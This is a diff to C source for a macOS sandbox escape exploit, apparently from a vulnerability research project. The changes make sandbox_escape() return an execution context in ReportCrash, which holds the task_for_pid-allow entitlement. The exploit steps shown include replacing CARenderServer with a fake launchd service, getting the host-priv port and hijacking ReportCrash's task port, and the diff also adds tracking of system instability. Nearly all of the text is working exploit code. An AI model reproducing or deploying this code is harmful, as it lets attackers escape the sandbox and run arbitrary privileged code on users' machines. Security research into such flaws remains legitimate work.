@@ -189,6 +189,7 @@ struct sandbox_escape_context {
 	mach_port_t reportcrash_task;
 	mach_port_t reportcrash_thread;
 	threadexec_t reportcrash_tx;
+	bool system_unstable;
 };
 
 // Exploit stage 1: Get the host-priv port by impersonating ReportCrash.SafetyNet and then crashing
@@ -295,7 +296,9 @@ get_druid_task(struct sandbox_escape_context *context) {
 		return false;
 	}
 	context->carenderserver_service = carenderserver;
-	// Replace CARenderServer with our own fake service in launchd.
+	// Replace CARenderServer with our own fake service in launchd. If the port is freed the
+	// system will be unstable.
+	context->system_unstable = true;
 	mach_port_t real_carenderserver, fake_carenderserver;
 	bool ok = launchd_replace_service_port(CARENDERSERVER_SERVICE_NAME,
 			&real_carenderserver, &fake_carenderserver);
@@ -512,7 +515,8 @@ get_reportcrash_task(struct sandbox_escape_context *context) {
 	assert(context->reportcrash_task != MACH_PORT_NULL
 			&& context->reportcrash_thread != MACH_PORT_NULL);
 	// We got ReportCrash's task port!
-	INFO("Got %s task! 0x%x", REPORTCRASH_NAME, context->reportcrash_task);
+	INFO("Got %s task 0x%x, pid %d!", REPORTCRASH_NAME, context->reportcrash_task,
+			reportcrash_pid);
 	return true;
 }
 
@@ -580,6 +584,7 @@ fix_exploit_damage(struct sandbox_escape_context *context) {
 	}
 	INFO("Restored service %s", SAFETYNET_NAME);
 	// Success! The system should be stable again.
+	context->system_unstable = false;
 	success = true;
 fail_1:
 	// Free launchd's task port in RemoteCrash.
@@ -620,10 +625,9 @@ clear_context(struct sandbox_escape_context *context) {
 }
 
 // Aaaaand putting it all together...
-bool
+threadexec_t
 sandbox_escape() {
 	DEBUG_TRACE(1, "%s", __func__);
-	bool success = false;
 	struct sandbox_escape_context context = {};
 	// The first step is to get the host-priv port using launchd-portrep. This is the safest
 	// part of the exploit since we'll replace com.apple.ReportCrash.SafetyNet, which is not
@@ -662,19 +666,17 @@ sandbox_escape() {
 	// Use ReportCrash to fix up the exploit damage.
 	ok = fix_exploit_damage(&context);
 	if (!ok) {
-		if (context.reportcrash_tx == NULL) {
-			goto fail;
-		}
-		// We got an execution context but failed to fix launchd. The system is likely to
-		// be unstable, but continue anyway.
-		ERROR("Failed to fix the damage caused by the exploit. "
-				"The system is likely to be unstable.");
+		// We may have obtained an execution context but failed to fix launchd. The system
+		// is likely to be unstable, but continue anyway.
+		ERROR("Failed to fix the damage caused by the exploit");
 	}
-	// Now hijack ReportCrash to execute arbitrary code with the task_for_pid-allow
+	// Now we can use ReportCrash to execute arbitrary code with the task_for_pid-allow
 	// entitlement. ;)
-	ERROR("TODO: HIJACK REPORTCRASH");//TODO
 fail:
 	clear_context(&context);
+	if (context.system_unstable) {
+		ERROR("The system is likely to be unstable");
+	}
 	DEBUG_TRACE(1, "%s: done", __func__);
-	return success;
+	return context.reportcrash_tx;
 }
